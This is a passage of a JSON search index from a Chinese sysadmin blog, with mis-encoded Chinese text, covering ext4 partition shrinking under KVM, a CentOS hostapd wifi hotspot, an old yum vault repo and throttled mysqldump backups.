pages\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda2: Linux rev 1.0 ext4 filesystem data \u003cspan class=\"o\"\u003e(\u003c/span\u003eneeds journal recovery\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003eextents\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003elarge files\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003ehuge files\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eèƒ½çœ‹å‡ºæ¥sda1æ˜¯äº¤æ¢åˆ†åŒºï¼Œé‚£ä¹ˆè¦ç¼©çš„åˆ†åŒºæ˜¯/dev/sda2ï¼Œæ–‡ä»¶ç±»å‹æ˜¯ext4\u003c/p\u003e\n\u003cp\u003eokï¼Œå…ˆç¡®ä¿è™šæœºå†…/åˆ†åŒºåªå åˆ°5Gï¼Œç„¶åæœ€å¥½é‡æ–°æ‹·è´ä¸€ä¸‹qcow2æ–‡ä»¶ï¼ŒæŠŠæ–‡ä»¶åˆ°å¼„åˆ°å‰é¢5Gä¸­ã€‚\u003c/p\u003e\n\u003cp\u003eç„¶åä¿®æ”¹ä¸€ä¸‹kvmè™šæœºé…ç½®ï¼Œå…ˆåŠ ä¸ªisoè¿›å…¥rescueæ¨¡å¼\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirsh edit xxx  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eæŠŠbooté¡ºåºä»hdæ”¹æˆcdrom\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;boot \u003cspan class=\"nv\"\u003edev\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;hd\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;boot \u003cspan class=\"nv\"\u003edev\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;cdrom\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;disk \u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;file\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003edevice\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;cdrom\u0026#39;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;driver \u003cspan class=\"nv\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;qemu\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;raw\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;\u003cspan class=\"nb\"\u003esource\u003c/span\u003e \u003cspan class=\"nv\"\u003efile\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;/export/kvm/iso/CentOS-7-x86_64-NetInstall-1708.iso\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;target \u003cspan class=\"nv\"\u003edev\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;hdc\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003ebus\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;ide\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;readonly/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;address \u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;drive\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003econtroller\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003ebus\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;1\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003etarget\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003eunit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;/disk\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç³»ç»Ÿå¯åŠ¨ï¼Œè¿›å…¥cdromå®‰è£…ï¼Œé€‰æ‹©Troubleshooting\u003c/p\u003e","title":"Ext4åˆ†åŒºçš„ç¼©å°"},{"content":"è‡ªå·±çš„ç¬”è®°æœ¬æ˜¯è£…äº†ä¸ªCentOSçš„ç³»ç»Ÿï¼Œç„¶åä¸Šé¢è·‘äº†ä¸ªVmwareï¼Œåˆè£…äº†Win10ï¼Œç„¶åæ¥ä¸¤ä¸ªå±å¹•ï¼Œå°çš„æ˜¯linuxè·‘gnomeï¼Œå¤§çš„æ˜¯Win10å±å¹•ï¼Œè¿™æ ·å¹²æ´»çš„ã€‚\nè·¯ç”±æ›´æ˜¯æ··ä¹±æ— æ¯”ï¼Œç½‘å¡æœ‰tun0 / wlan0 / eth0 ï¼Œæ²¡æœ‰å¼„br0ï¼Œè¿™æ˜¯å¤§å‰æã€‚å¦‚æœå¼„br0çš„è¯ï¼Œå¾—æ”¹ä¸€å †ä¸œè¥¿ã€‚\nè¿™æ ·çš„è¯wlan0æ— çº¿ç½‘å¡ä¸è”ç½‘å°±ç©ºé—²äº†ï¼Œäºæ˜¯æƒ³æŠŠæ— çº¿ç½‘å¡åšAPå…±äº«å‡ºæ¥ï¼Œç»™æ‰‹æœºç”¨ï¼Œåšæ³•çœŸæ˜¯æ¯”è¾ƒå¤æ‚ï¼Œå¼„äº†2å¤©æ‰å¼„å¥½ï¼Œç½‘ä¸Šçš„æ•™ç¨‹éƒ½æ˜¯è«åå•Šï¼Œä¸å¤ªé€‚åˆCentOSã€‚\nå…¶å®å°±æ˜¯å®‰è£…hostpapdï¼ŒæŠŠåšæ³•è®°å½•ä¸€ä¸‹ï¼š\né¦–å…ˆä¸æƒ³æ”¹åŠ¨å·²æœ‰çš„ç½‘ç»œï¼Œé‚£ä¹ˆæ¡¥æ¥è¿™æ¡è·¯å°±å½»åº•æ–­äº†ï¼Œåªèƒ½åœ¨æ— çº¿ç½‘å¡ä¸ŠåšDHCP+NATä¸€æ¡è·¯äº†ã€‚\nå…ˆæ£€æŸ¥ç½‘ç»œï¼š\nlspci -k | grep -A 3 -i \u0026#34;network\u0026#34; 03:00.0 Network controller: Qualcomm Atheros QCA9565 / AR9565 Wireless Network Adapter (rev 01) Subsystem: Lite-On Communications Inc Device 0662 Kernel driver in use: ath9k Kernel modules: ath9k çœ‹åˆ°è‡ªå·±çš„ç½‘å¡é©±åŠ¨æ˜¯ath9kï¼Œå†çœ‹çœ‹æ¨¡å—\nmodinfo ath9k | grep \u0026#39;depend\u0026#39; depends: mac80211,ath9k_hw,ath9k_common,cfg80211,ath mac80211, cfg80211çœ‹åˆ°è¿™ä¸ªå°±æ”¾å¿ƒäº†ï¼Œdriverå°±æ˜¯nl80211\nå†ç¡®è®¤ä¸€ä¸‹ï¼Œé‡Œé¢æœ‰* AP å­—æ ·è¿™æ ·å°±æ²¡é—®é¢˜äº†ï¼š\niw list|grep -A8 \u0026#34;Supported interface modes:\u0026#34; Supported interface modes: * IBSS * managed * AP * AP/VLAN * WDS * monitor * P2P-client * P2P-GO é¦–å…ˆçœ‹çœ‹è‡ªå·±çš„æ— çº¿ç½‘å¡ç‰©ç†åœ°å€ï¼Œ30:10:B3:6A:22:AAè®°ä¸‹æ¥\nifconfig -a ...... wlan0 Link encap:Ethernet HWaddr 30:10:B3:6A:22:AA ...... å†çœ‹çœ‹è‡ªå·±çš„ç¼ºçœè·¯ç”±ç½‘å¡ï¼Œæ˜¯è™šæ‹Ÿç½‘å¡tun0ï¼Œä¹Ÿè®°ä¸‹æ¥\nroute -n ...... 0.0.0.0 10.10.0.9 0.0.0.0 UG 0 0 0 tun0 ...... ä¸‹è½½hostapdå¹¶å®‰è£…ï¼Œå¦‚æœæç¤ºlibnlæ²¡è£…ï¼Œé‚£å°±è¡¥è£…ä¸€ä¸‹\nwget http://mirrors.ustc.edu.cn/epel/6/x86_64/hostapd-2.0-7.el6.x86_64.rpm yum -y install hostapd-2.0-7.el6.x86_64.rpm ç¦æ­¢æ‰NetworkManagerå¯¹æ— çº¿ç½‘å¡çš„ç®¡ç†\nvi /etc/NetworkManager/NetworkManager.conf ...... #åœ¨æ–‡ä»¶æœ€ååŠ ä¸¤è¡Œ [keyfile] unmanaged-devices=mac:30:10:B3:6A:22:AA ç„¶åç¬é—´å¤§å®¶å°±å¯ä»¥åœ¨gnomeçš„æ¡Œé¢ç½‘å¡é‡Œçœ‹åˆ°æ— çº¿ç½‘å¡å¤±è”äº†ï¼Œè¿™å°±å¯¹äº†ï¼\nç¼–è¾‘/etc/hostapd/hostapd.conf\nvi /etc/hostapd/hostapd.conf interface=wlan0 driver=nl80211 ssid=dontMessWithVincentValentine hw_mode=g channel=6 macaddr_acl=0 auth_algs=1 ignore_broadcast_ssid=0 wpa=3 wpa_passphrase=KeePGuessinG wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP rsn_pairwise=CCMP æ³¨æ„ï¼Œä¸Šé¢hwmodeæ˜¯æ— çº¿å·¥ä½œçš„æ¨¡å¼ï¼Œgã€bã€aéƒ½å¯ä»¥ï¼Œä¸€èˆ¬æ˜¯gï¼Œchannelæ˜¯ä¿¡é“ï¼Œæ‰¾ä¸ªæ²¡å¤šå°‘äººç”¨çš„ä¿¡é“æœ€å¥½ï¼Œ11ã€6ã€3ã€1éƒ½å¯ä»¥ã€‚interfaceå°±æ˜¯æ— çº¿ç½‘å¡äº†ï¼Œwlan0ã€‚ssidå’ŒwpapassphraseæŒ‰ä½ çš„éœ€æ±‚æ¥è®¾ç½®å³å¯ã€‚\nokï¼Œç„¶åè¿è¡Œ:\nrfkill unblock all rfkillæ˜¯æ§åˆ¶æ— çº¿å’Œè“ç‰™çš„å¼€å…³ï¼Œæˆ‘ä»¬æ”¾è¡Œä¸€åˆ‡ï¼Œå¦åˆ™hostapdæ— æ³•å¯åŠ¨ã€‚\nç°åœ¨ï¼Œå¯åŠ¨hostaptæµ‹è¯•ä¸€ä¸‹\nhostapd /etc/hostapd/hostapd.conf æ²¡æœ‰æ„å¤–çš„è¯ï¼Œå°±åº”è¯¥æˆåŠŸäº†ã€‚ä½†è¿™åªæ˜¯åšäº†ä¸€åŠï¼Œé¦–å…ˆæ”¹æ”¹dnsmasqï¼Œç»™æ— çº¿ç½‘å¡åˆ†é…åœ°å€\nvi /etc/dnsmasq.conf interface=wlan0 bind-interfaces listen-address=192.168.0.1 #no-dhcp-interface= dhcp-range=192.168.0.2,192.168.0.224,12h dhcp-option=3,192.168.0.1 dhcp-option=6,223.5.5.5 æ³¨æ„ï¼Œæˆ‘çš„dnsmasq.confå°±åªæœ‰è¿™ä¹ˆ7è¡Œï¼Œæ²¡æœ‰åˆ«çš„äº†ã€‚é‡Œé¢å¾ˆç®€å•ï¼Œé¦–å…ˆdhcpæ˜¯æ”¾åˆ°äº†wlan0ä¸Šå¹¶åˆ†é…åœ°å€ï¼Œdhcp-optionä¸­3è¡¨ç¤ºç½‘å…³ï¼Œgatewayï¼›6è¡¨ç¤ºdnsï¼Œè¿™é‡Œè®¾ç½®çš„æ˜¯é˜¿é‡Œçš„å…¬å…±dns 223.5.5.5ã€‚\nå‰©ä¸‹çš„æˆ‘ä»¬å°±å†™ä¸ªè„šæœ¬æ¥å®Œæˆå§ï¼š å†…å®¹å…¶å®å°±æ˜¯\nè§£é™¤æ— çº¿block é…ç½®wlan0çš„ipä¸º192.168.0.1 å¯åŠ¨dnsmasq åšiptableçš„nat æ³¨æ„é‡Œé¢æˆ‘æ˜¯ç”¨çš„tun0ï¼Œå¦‚æœä½ çš„ç¼ºçœè·¯ç”±æ˜¯eth0ï¼Œæ”¹äº†å³å¯ã€‚ vi /usr/local/bin/initSoftAP.sh #!/bin/bash start() { rfkill unblock all ifconfig wlan0 up 192.168.0.1 netmask 255.255.255.0 sleep 2 if [ -z \u0026#34;$(ps -e | grep dnsmasq)\u0026#34; ] then dnsmasq fi #Enable NAT iptables -F iptables -X iptables -t nat -A POSTROUTING -o tun0 -j MASQUERADE #Thanks to lorenzo #Uncomment the line below if facing problems while sharing PPPoE, see lorenzo\u0026#39;s comment for more details #iptables -I FORWARD -p tcp --tcp-flags SYN,RST SYN -j TCPMSS --clamp-mss-to-pmtu sysctl -w net.ipv4.ip_forward=1 #start hostapd hostapd -B /etc/hostapd/hostapd.conf } stop() { service iptables stop service dnsmasq stop pkill hostapd /sbin/ip link set down dev wlan0 } case $1 in start) start ;; stop) stop ;; *) echo \u0026#34;Usage: $0 {start|stop}\u0026#34; exit 2 esac ok, è¿™ä¹ˆå°±æå®šäº†ã€‚\n#å¯åŠ¨ /usr/local/bin/initSoftAP.sh start #åœæ­¢ /usr/local/bin/initSoftAP.sh stop ","permalink":"https://rendoumi.com/posts/20240123-centos_wifiap/","summary":"\u003cp\u003eè‡ªå·±çš„ç¬”è®°æœ¬æ˜¯è£…äº†ä¸ªCentOSçš„ç³»ç»Ÿï¼Œç„¶åä¸Šé¢è·‘äº†ä¸ªVmwareï¼Œåˆè£…äº†Win10ï¼Œç„¶åæ¥ä¸¤ä¸ªå±å¹•ï¼Œå°çš„æ˜¯linuxè·‘gnomeï¼Œå¤§çš„æ˜¯Win10å±å¹•ï¼Œè¿™æ ·å¹²æ´»çš„ã€‚\u003c/p\u003e\n\u003cp\u003eè·¯ç”±æ›´æ˜¯æ··ä¹±æ— æ¯”ï¼Œç½‘å¡æœ‰tun0 / wlan0 / eth0 ï¼Œæ²¡æœ‰å¼„br0ï¼Œè¿™æ˜¯å¤§å‰æã€‚å¦‚æœå¼„br0çš„è¯ï¼Œå¾—æ”¹ä¸€å †ä¸œè¥¿ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™æ ·çš„è¯wlan0æ— çº¿ç½‘å¡ä¸è”ç½‘å°±ç©ºé—²äº†ï¼Œäºæ˜¯æƒ³æŠŠæ— çº¿ç½‘å¡åšAPå…±äº«å‡ºæ¥ï¼Œç»™æ‰‹æœºç”¨ï¼Œåšæ³•çœŸæ˜¯æ¯”è¾ƒå¤æ‚ï¼Œå¼„äº†2å¤©æ‰å¼„å¥½ï¼Œç½‘ä¸Šçš„æ•™ç¨‹éƒ½æ˜¯è«åå•Šï¼Œä¸å¤ªé€‚åˆCentOSã€‚\u003c/p\u003e\n\u003cp\u003eå…¶å®å°±æ˜¯å®‰è£…\u003ccode\u003ehostpapd\u003c/code\u003eï¼ŒæŠŠåšæ³•è®°å½•ä¸€ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆä¸æƒ³æ”¹åŠ¨å·²æœ‰çš„ç½‘ç»œï¼Œé‚£ä¹ˆæ¡¥æ¥è¿™æ¡è·¯å°±å½»åº•æ–­äº†ï¼Œåªèƒ½åœ¨æ— çº¿ç½‘å¡ä¸ŠåšDHCP+NATä¸€æ¡è·¯äº†ã€‚\u003c/p\u003e\n\u003cp\u003eå…ˆæ£€æŸ¥ç½‘ç»œï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elspci -k \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -A \u003cspan class=\"m\"\u003e3\u003c/span\u003e -i \u003cspan class=\"s2\"\u003e\u0026#34;network\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e03:00.0 Network controller: Qualcomm Atheros QCA9565 / AR9565 Wireless Network Adapter \u003cspan class=\"o\"\u003e(\u003c/span\u003erev 01\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    Subsystem: Lite-On Communications Inc Device \u003cspan class=\"m\"\u003e0662\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    Kernel driver in use: ath9k\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    Kernel modules: ath9k\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eçœ‹åˆ°è‡ªå·±çš„ç½‘å¡é©±åŠ¨æ˜¯ath9kï¼Œå†çœ‹çœ‹æ¨¡å—\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emodinfo ath9k \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep \u003cspan class=\"s1\"\u003e\u0026#39;depend\u0026#39;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edepends:        mac80211,ath9k_hw,ath9k_common,cfg80211,ath  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003emac80211, cfg80211çœ‹åˆ°è¿™ä¸ªå°±æ”¾å¿ƒäº†ï¼Œdriverå°±æ˜¯nl80211\u003c/p\u003e\n\u003cp\u003eå†ç¡®è®¤ä¸€ä¸‹ï¼Œé‡Œé¢æœ‰* AP å­—æ ·è¿™æ ·å°±æ²¡é—®é¢˜äº†ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiw list\u003cspan class=\"p\"\u003e|\u003c/span\u003egrep -A8 \u003cspan class=\"s2\"\u003e\u0026#34;Supported interface modes:\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    Supported interface modes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e         * IBSS\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e         * managed\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e         * AP\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e         * AP/VLAN\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e         * WDS\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e         * monitor\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e         * P2P-client\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e         * P2P-GO\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé¦–å…ˆçœ‹çœ‹è‡ªå·±çš„æ— çº¿ç½‘å¡ç‰©ç†åœ°å€ï¼Œ30:10:B3:6A:22:AAè®°ä¸‹æ¥\u003c/p\u003e","title":"CentOSä¸‹åšæ— çº¿APçƒ­ç‚¹"},{"content":"å‰åŒäº‹Nå¹´å‰ä¹°äº†ä¸ªlinodeçš„ä¸»æœºï¼Œä¸€ç›´ç”¨ï¼Œç³»ç»Ÿæ˜¯CentOS 5.6 x86_64çš„ã€‚\nç°åœ¨æƒ³åœ¨ä¸Šé¢è£…ä¸ªè½¯ä»¶ï¼Œç»“æœyumå¤±æ•ˆäº†ï¼Œé‡è£…ç³»ç»Ÿä¸å¯èƒ½ï¼Œåªèƒ½æ‰¾ä¸ªæ—§çš„yumæºè®¾ç½®ä¸€ä¸‹äº†ã€‚\næºï¼š http://vault.centos.org ï¼Œæ‰¾åˆ°å­ç›®å½•\ncat /etc/yum.repos.d/base.repo [base] name=base baseurl=http://vault.centos.org/5.6/os/x86_64/ gpgcheck=0 enabled=1 æœ€åæ¸…æ‰ä¸€ä¸‹ç¼“å­˜å°±å¯ä»¥äº†\nyum clean all ","permalink":"https://rendoumi.com/posts/20240123-centos_yum_old/","summary":"\u003cp\u003eå‰åŒäº‹Nå¹´å‰ä¹°äº†ä¸ªlinodeçš„ä¸»æœºï¼Œä¸€ç›´ç”¨ï¼Œç³»ç»Ÿæ˜¯CentOS 5.6 x86_64çš„ã€‚\u003c/p\u003e\n\u003cp\u003eç°åœ¨æƒ³åœ¨ä¸Šé¢è£…ä¸ªè½¯ä»¶ï¼Œç»“æœyumå¤±æ•ˆäº†ï¼Œé‡è£…ç³»ç»Ÿä¸å¯èƒ½ï¼Œåªèƒ½æ‰¾ä¸ªæ—§çš„yumæºè®¾ç½®ä¸€ä¸‹äº†ã€‚\u003c/p\u003e\n\u003cp\u003eæºï¼š \u003ca href=\"http://vault.centos.org/\"\u003ehttp://vault.centos.org\u003c/a\u003e ï¼Œæ‰¾åˆ°å­ç›®å½•\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/yum.repos.d/base.repo  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003ebase\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebase  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ebaseurl\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttp://vault.centos.org/5.6/os/x86_64/  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003egpgcheck\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eenabled\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæœ€åæ¸…æ‰ä¸€ä¸‹ç¼“å­˜å°±å¯ä»¥äº†\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum clean all  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"ç»™è€æ—§çš„CentOSç³»ç»Ÿè®¾ç½®yumæº"},{"content":"å…¬å¸çš„MySQLæœåŠ¡å™¨å®šæ—¶åœ¨å‡Œæ™¨4:00å‡†æ—¶å¼€å§‹å¤‡ä»½ã€‚\nç»“æœæ˜¯ä¼šè§¦å‘æŠ¥è­¦ï¼Œnetæµé‡å¢é«˜ï¼Œcpuå¢é«˜ï¼Œç£ç›˜ioå¢é«˜ï¼Œè¿™ä¸ªæ˜¯å±äºæ­£å¸¸çš„ï¼Œå¦‚ä½•é¿å…è§¦å‘è­¦æŠ¥å‘¢ï¼Ÿ\næœ‰4ç§æ–¹æ³•ï¼š\nä¸€ã€ä¼˜åŒ–ioå’Œcpuï¼Œè®©å¤‡ä»½å†™ç£ç›˜çš„é€Ÿåº¦é™ä¸‹æ¥ï¼Œå¹³ç¨³çš„å†™å…¥ nice -n 10 ionice -c2 -n 7 /usr/bin/mysqldump -S /var/lib/mysql/mysql.sock -uroot --single-transaction --quick\\ --triggers -R --hex-blob --log-error=$db.log --databases $db \u0026gt; $basedir/$backdir/$db.sql äºŒã€åŠ å¿«å¤‡ä»½é€Ÿåº¦ï¼Œå¤šçº¿ç¨‹ï¼Œè®©æŠ¥è­¦è§¦å‘ä¹‹å‰å°±ç»“æŸå¤‡ä»½ COMMIT_COUNT=0 COMMIT_LIMIT=10 for DB in `cat ListOfDatabases.txt` do mysqldump -h... -u... -p... --hex-blob --routines --triggers ${DB} | gzip \u0026gt; ${DB}.sql.gz \u0026amp; (( COMMIT_COUNT++ )) if [ ${COMMIT_COUNT} -eq ${COMMIT_LIMIT} ] then COMMIT_COUNT=0 wait fi done if [ ${COMMIT_COUNT} -gt 0 ] then wait fi ä¸‰ã€ç”¨cstreamæ¥æ§åˆ¶æµé€Ÿ -t = throughput in bytes/sec 1000000æ˜¯ä¸€å…†ï¼Œæ¯ç§’åªå…è®¸å†™ä¸€å…†\nmysqldump --single-transaction --quick -u \u0026lt;USER\u0026gt; -p\u0026lt;PASS\u0026gt; \u0026lt;Database\u0026gt; | cstream -t 1000000 \u0026gt; backup.sql å››ã€ç”¨pvæ¥æ§åˆ¶æµé€Ÿ \u0026ndash;rate-limit Limit the transfer to a maximum of RATE bytes per second. å•ä½å¯ä»¥æ˜¯ï¼š1k 1m 1g 1t\nmysqldump --single-transaction --quick -u -p | pv --rate-limit 1m \u0026gt; db.sql ","permalink":"https://rendoumi.com/posts/20240123-mysql_backup_optimize/","summary":"\u003cp\u003eå…¬å¸çš„MySQLæœåŠ¡å™¨å®šæ—¶åœ¨å‡Œæ™¨4:00å‡†æ—¶å¼€å§‹å¤‡ä»½ã€‚\u003c/p\u003e\n\u003cp\u003eç»“æœæ˜¯ä¼šè§¦å‘æŠ¥è­¦ï¼Œnetæµé‡å¢é«˜ï¼Œcpuå¢é«˜ï¼Œç£ç›˜ioå¢é«˜ï¼Œè¿™ä¸ªæ˜¯å±äºæ­£å¸¸çš„ï¼Œå¦‚ä½•é¿å…è§¦å‘è­¦æŠ¥å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eæœ‰4ç§æ–¹æ³•ï¼š\u003c/p\u003e\n\u003ch4 